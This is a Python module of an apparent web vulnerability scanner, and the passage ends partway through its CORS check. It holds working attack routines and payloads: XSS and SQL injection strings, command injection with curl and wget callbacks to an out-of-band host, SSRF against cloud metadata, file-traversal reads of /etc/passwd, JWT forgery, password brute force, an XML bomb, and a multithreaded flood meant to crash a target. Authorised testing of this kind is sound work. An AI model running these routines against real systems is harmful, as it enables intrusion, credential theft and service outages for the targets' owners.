from typing import Any, Dict, List, Optional
import time
import concurrent.futures
import threading
import urllib.parse
import os
import json
import string
import random
import socket
import hashlib
import ssl
from ..http_client import HttpClient, ResponseWrapper
import zipfile
import io
from ..scenarios import SimpleScenario
from ..core.logic import FuzzingEngine

fuzzer = FuzzingEngine()

# ==========================================
# OMNI-ATTACK ENGINE: LOGIC & PAYLOADS
# ==========================================

def run_advanced_dos(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Advanced DoS: Layer 7 stress testing (Slow HTTP POST simulation)."""
    if not scenario.config.get("aggressive"):
        return {"scenario_id": scenario.id, "attack_type": "advanced_dos", "passed": True, "details": "Skipped in non-aggressive mode."}
    
    print(f"    -> [DOS] Probing Layer 7 stability (Stress Phase)...")
    
    # 1. Baseline latency
    start = time.time()
    client.send("GET", scenario.target, is_canary=True)
    baseline = time.time() - start
    
    # 2. Simulate High-Payload stress or Slow Body
    # We use a large dummy body to test server capacity
    large_body = "A" * 500000 
    
    results = []
    for _ in range(5):
        try:
            r = client.send("POST", scenario.target, form_body=large_body, timeout=10)
            results.append(r.elapsed_ms)
        except:
            results.append(10000) # Timeout penalty
            
    avg_ms = sum(results) / len(results)
    stability_degradation = avg_ms / (baseline * 1000) if baseline > 0 else 1
    
    status = "VULNERABLE" if stability_degradation > 10 else "SECURE"
    return {
        "scenario_id": scenario.id, 
        "attack_type": "advanced_dos", 
        "passed": status == "SECURE", 
        "status": status,
        "details": f"Stability Degradation Check: Target latency increased by {stability_degradation:.1f}x under Layer 7 stress."
    }

def run_header_security_check(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Checks for missing security headers (Clickjacking, MIME, CORS)."""
    resp = client.send(scenario.method, scenario.target)
    headers = {k.lower(): v for k, v in resp.headers.items()}
    issues = []
    
    if resp.status_code == 0:
        return {"scenario_id": scenario.id, "attack_type": "header_security", "passed": False, "details": {"error": f"Connection Error: {resp.text}"}}

    # Standard Checks
    if "x-frame-options" not in headers and "content-security-policy" not in headers:
        issues.append("Missing Clickjacking Protection (X-Frame-Options / CSP)")
    if "x-content-type-options" not in headers:
        issues.append("Missing X-Content-Type-Options: nosniff")
    
    # Aggressive/In-depth Checks
    if scenario.config.get("aggressive"):
        if "strict-transport-security" not in headers and scenario.target.startswith("https"):
            issues.append("Missing HSTS Header (High Severity for Prod)")
        if "permissions-policy" not in headers:
            issues.append("Missing Permissions-Policy")
        acao = headers.get("access-control-allow-origin")
        if acao == "*":
            issues.append("CORS Misconfiguration: Wildcard Origin Allowed")

    return {"scenario_id": scenario.id, "attack_type": "header_security", "passed": len(issues) == 0, "status": "CONFIRMED" if issues else "SECURE", "details": {"issues": issues}}

def run_xss_scan(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Reflected & Path-based XSS with Polyglot payloads."""
    # FREE TIER: Standard, safe payloads
    payloads = [
        "<script>alert(1)</script>",
        "<svg/onload=alert(1)>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(1)"
    ]
    
    # AGGRESSIVE TIER: Obfuscated, WAF-evasive, and modern payloads
    if scenario.config.get("aggressive"):
        payloads.extend([
            "';alert(1)//",
            "\";alert(1)//",
            "--></script><script>alert(1)</script>",
            "'\"><img src=x onerror=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<video><source onerror=alert(1)>",
            "<math><a xlink:href=\"javascript:alert(1)\">X",
            "javascript://%250Aalert(1)",
            "{{constructor.constructor('alert(1)')()}}",
            "<marquee loop=1 width=0 onfinish=alert(1)>X</marquee>",
            "<input onfocus=alert(1) autofocus>",
            "\"'><script>confirm(1)</script>",
            "<scr<script>ipt>alert(1)</script>",
            "%%3Cscript%%3Ealert(1)%%3C/script%%3E",
            "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e"
        ])

    from ..utils import extract_reflection_context
    fields = scenario.config.get("fields", ["q", "search", "name", "id", "query"])
    issues, lock, artifacts = [], threading.Lock(), []

    limit = 2 if client._is_localhost else (50 if scenario.config.get("aggressive") else 10)
    
    # BASELINE for XSS
    baseline = client.send("GET", scenario.target, params={fields[0]: "BENIGN_VAL"}, is_canary=True).text

    def check_xss(field):
        for p in payloads:
            if issues: break
            # Test GET Params
            resp = client.send("GET", scenario.target, params={field: p}, is_canary=True)
            
            # Context-Aware Detection
            context = extract_reflection_context(resp.text, p)
            if context != "none" and p not in baseline:
                # Double check with a unique string
                unique_canary = f"BRK_{random.randint(1000,9999)}"
                resp_verify = client.send("GET", scenario.target, params={field: unique_canary}, is_canary=True)
                if unique_canary in resp_verify.text:
                    with lock:
                        issues.append(f"XSS Reflected in GET '{field}' (Context: {context})")
                        artifacts.append({"request": resp_verify.request_dump, "response": resp_verify.response_dump})
                    break
            
            # Test POST JSON (Aggressive)
            if scenario.config.get("aggressive"):
                resp_post = client.send("POST", scenario.target, json_body={field: p}, is_canary=True)
                context_post = extract_reflection_context(resp_post.text, p)
                if context_post != "none" and p not in baseline:
                    unique_canary = f"BRK_{random.randint(1000,9999)}"
                    resp_verify = client.send("POST", scenario.target, json_body={field: unique_canary}, is_canary=True)
                    if unique_canary in resp_verify.text:
                        with lock:
                            issues.append(f"XSS Reflected in POST JSON '{field}' (Context: {context_post})")
                            artifacts.append({"request": resp_verify.request_dump, "response": resp_verify.response_dump})
                        break

    with concurrent.futures.ThreadPoolExecutor(max_workers=min(limit, len(fields))) as executor:
        executor.map(check_xss, fields)

    return {
        "scenario_id": scenario.id, 
        "attack_type": "xss", 
        "passed": not issues, 
        "confidence": "HIGH" if issues else "LOW",
        "details": issues,
        "artifacts": artifacts
    }

def run_jwt_brute(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """JWT Weak Secret Brute Force: Testing common keys."""
    # Real logic: Try to sign a token with common secrets and see if server accepts it
    import base64
    import hmac
    import hashlib
    
    # We need a base token to work with. If not provided, we use a guest one.
    base_token = scenario.config.get("token", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaGFja2VyIn0")
    header_name = scenario.config.get("header", "Authorization")
    
    parts = base_token.split('.')
    if len(parts) < 2:
        return {"scenario_id": scenario.id, "attack_type": "jwt_brute", "passed": True, "details": "Invalid base token."}
    
    payload_to_sign = f"{parts[0]}.{parts[1]}"
    secrets = ["secret", "123456", "password", "admin", "dev", "test", "key", "root"]
    
    issues, artifacts = [], []
    for s in secrets:
        signature = hmac.new(s.encode(), payload_to_sign.encode(), hashlib.sha256).digest()
        new_token = f"{payload_to_sign}.{base64.urlsafe_b64encode(signature).decode().rstrip('=')}"
        
        resp = client.send("GET", scenario.target, headers={header_name: f"Bearer {new_token}"})
        if resp.status_code == 200 and ("hacker" in resp.text.lower() or "admin" in resp.text.lower()):
            issues.append(f"JWT Weak Secret Confirmed: '{s}'")
            artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
            break
            
    return {"scenario_id": scenario.id, "attack_type": "jwt_brute", "passed": not issues, "details": issues, "artifacts": artifacts}

def run_sqli_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """SQL Injection: Boolean-based, Time-based, and Internal Error Detection."""
    # FREE TIER: Simple auth bypass and error probes
    payloads = [
        {"p": "' OR '1'='1", "t": "auth"},
        {"p": "' OR 1=1 --", "t": "auth"},
        {"p": "admin' --", "t": "auth"},
    ]
    
    # AGGRESSIVE TIER: Time-based, Union, and WAF evasion
    if scenario.config.get("aggressive"):
        payloads.extend([
            {"p": "'; WAITFOR DELAY '0:0:10'--", "t": "time"},
            {"p": "' OR SLEEP(10)--", "t": "time"},
            {"p": "') OR pg_sleep(10)--", "t": "time"},
            {"p": "' UNION SELECT @@version,user(),3,4,5,6--", "t": "union"},
            {"p": "' UNION SELECT null,table_name,null,null FROM information_schema.tables--", "t": "union"},
            {"p": "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--", "t": "time"},
            {"p": "1' ORDER BY 10--", "t": "error"}
        ])

    fields = scenario.config.get("fields", ["username", "id", "q", "token"])
    issues, lock, artifacts = [], threading.Lock(), []
    limit = 2 if client._is_localhost else (50 if scenario.config.get("aggressive") else 10)
    
    # BASELINE for SQLi
    baseline_resp = client.send("GET", scenario.target, params={fields[0]: "BENIGN_VAL"}, is_canary=True)
    baseline_time = baseline_resp.elapsed_ms / 1000.0

    def check_sqli(field):
        for item in payloads:
            if issues: break
            payload = item["p"]
            
            # Probing GET
            resp = client.send("GET", scenario.target, params={field: payload}, is_canary=True)
            duration = resp.elapsed_ms / 1000.0
            
            # REINFORCEMENT FEEDBACK: Calculate delta from baseline
            delta = abs(len(resp.text) - len(baseline_resp.text)) / max(1, len(baseline_resp.text))
            fuzzer.record_feedback("sql", delta)
            
            # ADAPTIVE MUTATION (Aggressive Mode Only)
            if scenario.config.get("aggressive") and not issues and delta > 0.1:
                mutant = fuzzer.mutate(payload, "sql")
                resp = client.send("GET", scenario.target, params={field: mutant}, is_canary=True)
                duration = resp.elapsed_ms / 1000.0
                payload = mutant # Update for detection logic below
            
            # 1. Error-based Detection
            err_sigs = ["sql syntax", "unclosed quotation", "mysql_fetch", "sqlite3.Error", "postgresql query failed", "driver failure"]
            if any(sig in resp.text.lower() for sig in err_sigs):
                if not any(sig in baseline_resp.text.lower() for sig in err_sigs):
                    with lock:
                        issues.append(f"SQL Error in '{field}' with {payload}")
                        artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
                    break
                
            # 2. Time-based Detection (Robust)
            if item["t"] == "time" and duration > (baseline_time + 4.5):
                resp_retry = client.send("GET", scenario.target, params={field: payload}, is_canary=True)
                if (resp_retry.elapsed_ms / 1000.0) > (baseline_time + 4.5):
                     with lock:
                         issues.append(f"CONFIRMED Time-based SQLi in '{field}'")
                         artifacts.append({"request": resp_retry.request_dump, "response": resp_retry.response_dump})
                     break

            # 3. Auth Bypass Detection (DELTA logic)
            if item["t"] == "auth" and resp.status_code == 200 and baseline_resp.status_code != 200:
                if "login" not in resp.text.lower() or "dashboard" in resp.text.lower():
                     with lock:
                         issues.append(f"Potential Auth Bypass in '{field}'")
                         artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
                     break

    with concurrent.futures.ThreadPoolExecutor(max_workers=min(limit, len(fields))) as executor:
        executor.map(check_sqli, fields)

    return {
        "scenario_id": scenario.id, 
        "attack_type": "sql_injection", 
        "passed": not issues, 
        "confidence": "HIGH" if issues else "LOW", 
        "details": issues,
        "artifacts": artifacts
    }

def run_brute_force(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Brute Force: Common credentials and weak passwords."""
    username = scenario.config.get("user", "admin")
    # FREE TIER: Top 5 common passwords
    passwords = ["123456", "password", "12345678", "qwerty", "admin"]
    
    # AGGRESSIVE TIER: Expanded wordlist
    if scenario.config.get("aggressive"):
        passwords.extend(["12345", "password123", "root", "guest", "1234567"])

    success_creds, lock, artifacts = [], threading.Lock(), []
    def check_pwd(pwd):
        resp = client.send("POST", scenario.target, json_body={"username": username, "password": pwd})
        if resp.status_code == 200 and any(k in resp.text.lower() for k in ["token", "success", "profile", "dashboard"]):
            with lock: 
                success_creds.append(pwd)
                artifacts.append({"request": resp.request_dump, "response": resp.response_dump})

    limit = 2 if client._is_localhost else 20
    with concurrent.futures.ThreadPoolExecutor(max_workers=limit) as executor:
        executor.map(check_pwd, passwords)

    return {"scenario_id": scenario.id, "attack_type": "brute_force", "passed": not success_creds, "details": f"Credentials Found: {success_creds}" if success_creds else "No weak credentials found.", "artifacts": artifacts}

def run_rce_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Remote Code Execution: OS Command Injection & Function Injection."""
    # FREE TIER: Simple info gather
    payloads = ["; id", "| whoami", "$(id)", "`id`", "& whoami"]
    
    # AGGRESSIVE TIER: Out-of-band and blind techniques
    if scenario.config.get("aggressive"):
        payloads.extend([
            "import os; os.system('id')",
            "; sleep 5",
            "<?php system('id'); ?>"
        ])
        
        # Inject OOB paylods if available
        if client.oob_server:
            # We generate a token but we need to construct the command dynamically inside the loop
            pass

    fields = scenario.config.get("fields", ["id", "cmd", "q", "query"])
    issues, lock = [], threading.Lock()
    limit = 2 if client._is_localhost else (50 if scenario.config.get("aggressive") else 10)
    
    # BASELINE for RCE
    baseline_resp = client.send(scenario.method, scenario.target, json_body={fields[0]: "BENIGN_VAL"}, is_canary=True)
    baseline_time = baseline_resp.elapsed_ms / 1000.0

    artifacts = []
    def check_field(field):
        # 1. OOB Validation (Zero False Positive)
        if client.oob_server:
            oob = client.oob_server.generate_payload(context=f"rce_{field}")
            oob_url = oob["url"]
            oob_payloads = [
                f"; curl {oob_url}",
                f"; wget {oob_url}",
                f"| curl {oob_url}",
                f"$(curl {oob_url})"
            ]
            for op in oob_payloads:
                if issues: break
                client.send("POST", scenario.target, json_body={field: op})
                if client.oob_server.verify(oob["token"], timeout=1):
                    with lock:
                        issues.append(f"RCE CONFIRMED (OOB Callback) in '{field}' -> {op}")
                        artifacts.append({"request": f"POST {scenario.target} body={field}:{op}", "response": "OOB Callback Received"})
                    return

        # 2. Standard Heuristics
        for p in payloads:
            if issues: break
            resp = client.send("POST", scenario.target, json_body={field: p}, is_canary=True)
            duration = resp.elapsed_ms / 1000.0
            output = resp.text.lower()
            
            # OS Command output check
            if ("uid=" in output and "gid=" in output) or "nt authority" in output or "microsoft windows [" in output:
                if "uid=" not in baseline_resp.text.lower():
                    with lock:
                        issues.append(f"RCE CONFIRMED in '{field}' with payload {p}")
                        artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
                    break
            
            # Time-based RCE
            if "sleep 5" in p and duration > (baseline_time + 4.5):
                resp_retry = client.send("POST", scenario.target, json_body={field: p}, is_canary=True)
                if (resp_retry.elapsed_ms / 1000.0) > (baseline_time + 4.5):
                     with lock:
                         issues.append(f"CONFIRMED Blind RCE (Time-based) in '{field}'")
                         artifacts.append({"request": resp_retry.request_dump, "response": resp_retry.response_dump})
                     break

    with concurrent.futures.ThreadPoolExecutor(max_workers=min(limit, len(fields))) as executor:
        executor.map(check_field, fields)

    return {
        "scenario_id": scenario.id, 
        "attack_type": "rce", 
        "passed": not issues, 
        "confidence": "HIGH" if issues else "LOW", 
        "status": "CONFIRMED" if issues else "SECURE", 
        "details": issues,
        "artifacts": artifacts
    }

def run_ssrf_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Server Side Request Forgery: Localhost & Cloud Metadata."""
    # FREE TIER: Local and AWS metadata
    payloads = [
        "http://localhost:80",
        "http://127.0.0.1:22",
        "http://169.254.169.254/latest/meta-data/"
    ]
    
    # AGGRESSIVE TIER: Internal port scanning & Cloud specific (Google, Azure)
    if scenario.config.get("aggressive"):
        payloads.extend([
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "file:///etc/passwd",
            "dict://127.0.0.1:6379/", # Redis probe
            "http://192.168.1.1/"
        ])

    fields = scenario.config.get("fields", ["url", "dest", "webhook", "callback"])
    issues, lock, artifacts = [], threading.Lock(), []
    limit = 2 if client._is_localhost else 20

    # SSRF Detection Logic
    baseline_resp = client.send("POST", scenario.target, json_body={fields[0]: "BENIGN_VAL"})
    baseline = baseline_resp.text.lower()

    def check_ssrf(field):
        for p in payloads:
            if issues: break
            resp = client.send("POST", scenario.target, json_body={field: p})
            text = resp.text.lower()
            
            # OOB Confirmation Logic (Zero False Positive)
            if client.oob_server:
                oob_payload = client.oob_server.generate_payload(context=f"ssrf_{field}")
                # Inject OOB URL
                resp_oob = client.send("POST", scenario.target, json_body={field: oob_payload["url"]})
                
                # Check for immediate confirmation
                if client.oob_server.verify(oob_payload["token"], timeout=2):
                    with lock: 
                        issues.append(f"Blind SSRF CONFIRMED (OOB Callback Received) in '{field}' -> {oob_payload['url']}")
                        artifacts.append({"request": f"POST {scenario.target} body={field}:{oob_payload['url']}", "response": "OOB Token Verified"})
                    break

            if resp.status_code == 200 and baseline_resp.status_code != 200 and len(resp.text) > 500:
                with lock: 
                    issues.append(f"Potential SSRF (Baseline {baseline_resp.status_code} -> 200 OK) in '{field}'")
                    artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
                break

    with concurrent.futures.ThreadPoolExecutor(max_workers=min(limit, len(fields))) as executor:
        executor.map(check_ssrf, fields)

    return {"scenario_id": scenario.id, "attack_type": "ssrf", "passed": not issues, "status": "CONFIRMED" if issues else "SECURE", "details": issues, "artifacts": artifacts}

def run_lfi_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Local File Inclusion: Traversal and Absolute Pathing."""
    # FREE TIER: Standard Unix/Windows files
    payloads = ["../../../../etc/passwd", "../../../../windows/win.ini", "/etc/passwd"]
    
    # AGGRESSIVE TIER: Log poisoning and filter bypass
    if scenario.config.get("aggressive"):
        payloads.extend([
            "....//....//....//....//etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "/proc/self/environ",
            "/var/log/apache2/access.log"
        ])

    fields = scenario.config.get("fields", ["file", "page", "path", "doc"])
    issues, artifacts = [], []

    for field in fields:
        for p in payloads:
            resp = client.send("GET", scenario.target, params={field: p})
            if "root:x:0:0" in resp.text or "[extensions]" in resp.text.lower():
                issues.append(f"LFI Found in '{field}' with {p}")
                artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
                break

    return {"scenario_id": scenario.id, "attack_type": "lfi", "passed": not issues, "status": "CONFIRMED" if issues else "SECURE", "details": issues, "artifacts": artifacts}

def run_idor_check(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Insecure Direct Object Reference: ID Incrementing and UUID Probing."""
    # FREE TIER: Simple numeric increments
    id_range = ["1", "2", "3", "10", "100"]
    
    # AGGRESSIVE TIER: UUIDs and common patterns
    if scenario.config.get("aggressive"):
        id_range.extend(["0", "-1", "9999", "admin", "test"])

    from ..utils import StructuralComparator
    issues, lock, artifacts = [], threading.Lock(), []
    base_target = scenario.target.replace("{{id}}", "ID_PLACEHOLDER")
    
    # BASELINE for IDOR
    baseline = client.send(scenario.method, scenario.target if "{{" not in scenario.target else scenario.target.replace("{{id}}", "EXISTING_VAL_999"), is_canary=True)

    def check_id(val):
        path = base_target.replace("ID_PLACEHOLDER", str(val))
        if path == base_target: path = f"{scenario.target.rstrip('/')}/{val}"
        
        resp = client.send(scenario.method, path, is_canary=True)
        
        # Enhanced Detection: Using Structural Diffing
        if resp.status_code == 200 and baseline.status_code != 200:
             with lock: 
                 issues.append(f"IDOR: Private Resource accessible at ID: {val} (Baseline was {baseline.status_code})")
                 artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
        elif resp.status_code == 200 and StructuralComparator.is_significant_delta(baseline.text, resp.text):
             if "error" not in resp.text.lower() and "login" not in resp.text.lower():
                 with lock: 
                     issues.append(f"IDOR: Distinct structural object discovered at ID: {val}")
                     artifacts.append({"request": resp.request_dump, "response": resp.response_dump})

    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        executor.map(check_id, id_range)

    return {"scenario_id": scenario.id, "attack_type": "idor", "passed": not issues, "details": issues, "artifacts": artifacts}

def run_nosql_injection(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """NoSQL Injection: MongoDB Operator Abuse."""
    # FREE TIER: Simple $ne bypass
    payloads = [{"$ne": "random_string_123"}, {"$gt": ""}]
    
    # AGGRESSIVE TIER: Regex and complex logic
    if scenario.config.get("aggressive"):
        payloads.extend([{"$regex": ".*"}, {"$where": "true"}])

    from ..utils import StructuralComparator
    fields = scenario.config.get("fields", ["username", "password", "id"])
    issues, lock, artifacts = [], threading.Lock(), []
    
    # BASELINE
    baseline_resp = client.send("POST", scenario.target, json_body={fields[0]: "BENIGN_USER_XYZ"})

    def check_nosql(field):
        for p in payloads:
            if issues: break
            resp = client.send("POST", scenario.target, json_body={field: p})
            # NoSQL Bypass detection: Structural Delta logic
            if resp.status_code == 200 and baseline_resp.status_code != 200:
                 if any(k in resp.text.lower() for k in ["token", "success", "welcome"]):
                     with lock:
                         issues.append(f"NoSQL Bypass in '{field}' (Baseline was {baseline_resp.status_code})")
                         artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
                     break
            elif resp.status_code == 200 and StructuralComparator.is_significant_delta(baseline_resp.text, resp.text):
                 if "welcome" in resp.text.lower() and "welcome" not in baseline_resp.text.lower():
                     with lock:
                         issues.append(f"NoSQL Injection Structural Shift in '{field}'")
                         artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
                     break

    with concurrent.futures.ThreadPoolExecutor(max_workers=len(fields)) as executor:
        executor.map(check_nosql, fields)

    return {"scenario_id": scenario.id, "attack_type": "nosql_injection", "passed": not issues, "details": issues, "artifacts": artifacts}

def run_jwt_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """JWT Weaknesses: None Algorithm and Kidd/Jku abuse."""
    header_name = scenario.config.get("header", "Authorization")
    # Real payload for 'none' alg
    payloads = [
        "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
        "eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
        "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."
    ]
    
    issues = []
    for p in payloads:
        resp = client.send("GET", scenario.target, headers={header_name: f"Bearer {p}"})
        if resp.status_code == 200 and ("admin" in resp.text.lower() or "dashboard" in resp.text.lower()):
            issues.append(f"JWT 'none' algorithm accepted with payload: {p[:15]}...")
            break

    return {"scenario_id": scenario.id, "attack_type": "jwt_weakness", "passed": not issues, "status": "CONFIRMED" if issues else "SECURE", "details": issues}

def run_ssti_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Server Side Template Injection: Jinja2, Mako, Thymeleaf."""
    # High-Entropy Payload: 12345 * 12345 = 152399025
    canary = "152399025"
    payload = "{{12345*12345}}"
    
    if scenario.config.get("aggressive"):
        payload = "{{constructor.constructor('return 152399025')()}}"

    fields = scenario.config.get("fields", ["name", "q", "comment"])
    issues, artifacts = [], []
    
    # BASELINE
    baseline = client.send("GET", scenario.target, params={fields[0]: "BENIGN"}).text

    for f in fields:
        resp = client.send("GET", scenario.target, params={f: payload})
        if canary in resp.text and canary not in baseline:
            issues.append(f"SSTI detected in '{f}' (Confirmed math evaluation)")
            artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
            break

    return {"scenario_id": scenario.id, "attack_type": "ssti", "passed": not issues, "details": issues, "artifacts": artifacts}

def run_dos_extreme(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Denial of Service: Resource Exhaustion & Stress Test."""
    # FREE TIER: Light stress
    requests_to_send = 500
    threads_count = 50
    
    # AGGRESSIVE TIER: Heavy flood - Aim to crash
    if scenario.config.get("aggressive"):
        requests_to_send = 100000 
        threads_count = 200 # High concurrency to overwhelm

    stats, stop_event = {"requests": 0, "errors": 0}, threading.Event()
    
    def flood():
        while not stop_event.is_set() and stats["requests"] < requests_to_send:
            try: 
                client.send(scenario.method, scenario.target, is_canary=True)
                stats["requests"] += 1
            except: 
                stats["errors"] += 1
    
    threads = [threading.Thread(target=flood, daemon=True) for _ in range(threads_count)]
    for t in threads: t.start()
    
    start = time.time()
    # Sustain attack for longer in aggressive mode
    duration = 30 if scenario.config.get("aggressive") else 5
    
    while time.time() - start < duration and stats["requests"] < requests_to_send:
        time.sleep(0.5)
    
    stop_event.set()
    
    # Check impact
    passed = True
    details = f"Stress Test: {stats['requests']} requests sent. Errors: {stats['errors']}"
    
    if stats["errors"] > (stats["requests"] * 0.5):
        passed = False
        details += " (High Error Rate detected - Server likely struggling)"
        
    return {"scenario_id": scenario.id, "attack_type": "dos_extreme", "passed": passed, "details": details}


def run_xml_bomb(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """XML Billion Laughs: Memory exhaustion probe."""
    payload = """<?xml version="1.0"?>
    <!DOCTYPE lolz [
     <!ENTITY lol "lol">
     <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
     <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
     <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
    ]>
    <lolz>&lol3;</lolz>"""
    resp = client.send("POST", scenario.target, form_body=payload, headers={"Content-Type": "application/xml"})
    issues = ["XML Bomb Triggered Service Lag"] if resp.elapsed_ms > 1000 or resp.status_code == 500 else []
    return {"scenario_id": scenario.id, "attack_type": "xml_bomb", "passed": not issues, "details": issues or "Target XML parser is resilient."}

def run_redos(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Regular Expression DoS: Catastrophic backtracking probe."""
    # Payload designed to trip O(2^n) regex engines
    # Payload designed to trip O(2^n) regex engines
    payload = "a" * 100 + "!"
    if scenario.config.get("aggressive"):
        payload = "a" * 5000 + "!"
        
    field = scenario.config.get("fields", ["email", "q"])[0]
    resp = client.send("POST", scenario.target, json_body={field: payload}, timeout=10)
    issues = ["Potential ReDoS detected (Timeout)"] if resp.status_code == 0 or resp.elapsed_ms > 5000 else []
    return {"scenario_id": scenario.id, "attack_type": "redos", "passed": not issues, "details": issues or "Target regex engine handled complex input."}

def run_prototype_pollution(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Prototype Pollution: Object.prototype manipulation."""
    payloads = [{"__proto__": {"polluted": "true"}}, {"constructor": {"prototype": {"polluted": "true"}}}]
    issues = []
    
    for payload in payloads:
        resp = client.send("POST", scenario.target, json_body=payload)
        if resp.status_code == 500:
            issues.append("Possible Prototype Pollution: Server Error 500 on injection")
            break
            
    return {"scenario_id": scenario.id, "attack_type": "prototype_pollution", "passed": not issues, "details": issues}

def run_clickjacking(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Clickjacking: Frame protection check."""
    resp = client.send("GET", scenario.target)
    issues, xfo, csp = [], resp.headers.get("X-Frame-Options", "").lower(), resp.headers.get("Content-Security-Policy", "").lower()
    if "deny" not in xfo and "sameorigin" not in xfo:
        if "frame-ancestors" not in csp:
            issues.append("Clickjacking Risk: Missing X-Frame-Options and CSP frame-ancestors.")
    return {"scenario_id": scenario.id, "attack_type": "clickjacking", "passed": not issues, "status": "CONFIRMED" if issues else "SECURE", "details": issues}


def run_open_redirect(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Open Redirect: Header and Meta-refresh bypasses using OOB for zero false-positives."""
    fields = scenario.config.get("fields", ["next", "url", "redirect", "u", "returnTo", "target", "goto", "dest", "destination"])
    issues, lock, artifacts = [], threading.Lock(), []

    def check_redirect(field):
        # Determine destination - Always prioritize OOB to avoid false positives
        if client.oob_server:
            oob = client.oob_server.generate_payload(context=f"open_redirect_{field}")
            dest_url = oob["url"]
            dest_domain = urllib.parse.urlparse(dest_url).netloc
            token = oob["token"]
        else:
            dest_url = "http://evil.com"
            dest_domain = "evil.com"
            token = None

        # Build dynamic payloads using our target destination
        local_payloads = [dest_url, f"//{dest_domain}"]
        if scenario.config.get("aggressive"):
            local_payloads.extend([
                f"/%09/{dest_domain}",
                f"/%5c/{dest_domain}",
                f"/%2f%2f{dest_domain}",
                f"//google.com%2f{dest_domain}",
                f"//google.com%2f%2e%2e%2f{dest_domain}",
                f"http:{dest_domain}",
                f"https://{dest_domain}%23.google.com"
            ])

        for p in local_payloads:
            if issues: break
            
            # Aggressive bypass headers specific to this request
            bypass_headers = {
                "X-Forwarded-Host": dest_domain,
                "X-Original-URL": f"/{field}={p}",
                "X-Rewrite-URL": f"/{field}={p}"
            }
            
            # Send with redirects disabled to catch the Location header
            resp = client.send("GET", scenario.target, params={field: p}, headers=bypass_headers, allow_redirects=False)
            
            # Evidence collection
            location = resp.headers.get("Location", "")
            
            # 1. OOB Validation (Zero False Positive Goal)
            if token and client.oob_server.verify(token, timeout=1.5):
                with lock:
                    if not any(f"'{field}'" in iss for iss in issues):
                        issues.append(f"CONFIRMED Open Redirect (OOB Callback Verified) in '{field}' using {p}")
                        artifacts.append({"request": resp.request_dump, "response": f"OOB Interaction Detected for Token: {token}"})
                break

            # 2. Strict Header Validation
            if location:
                parsed_loc = urllib.parse.urlparse(location)
                # Check if it points to our domain or starts with the full OOB URL
                if dest_domain == parsed_loc.netloc or location.startswith(dest_url) or f"//{dest_domain}" in location:
                    with lock:
                        if not any(f"'{field}'" in iss for iss in issues):
                            issues.append(f"CONFIRMED Open Redirect in '{field}' -> Explicit Location Header: {location}")
                            artifacts.append({"request": resp.request_dump, "response": resp.response_dump})
                    break

    # Execute in parallel for speed
    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        executor.map(check_redirect, fields)

    return {"scenario_id": scenario.id, "attack_type": "open_redirect", "passed": not issues, "details": issues, "artifacts": artifacts}

def run_cors_misconfig(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """CORS Misconfiguration: Wildcard and Reflection checks."""
    issues = []
    
    # FREE TIER: Simple wildcard check
    resp = client.send("OPTIONS", scenario.target, headers={"Origin": "https://evil.com"})
    acao = resp.headers.get("Access-Control-Allow-Origin", "")
    if acao == "*" or acao == "https://evil.com":
        issues.append(f"CORS Misconfiguration: {acao} reflected in Access-Control-Allow-Origin")
        
    # AGGRESSIVE TIER: Credential and Null origin checks
    if scenario.config.get("aggressive"):
        resp_null = client.send("OPTIONS", scenario.target, headers={"Origin": "null"})
        if resp_null.headers.get("Access-Control-Allow-Origin") == "null":
            issues.append("CORS Misconfiguration: Null Origin allowed")
            
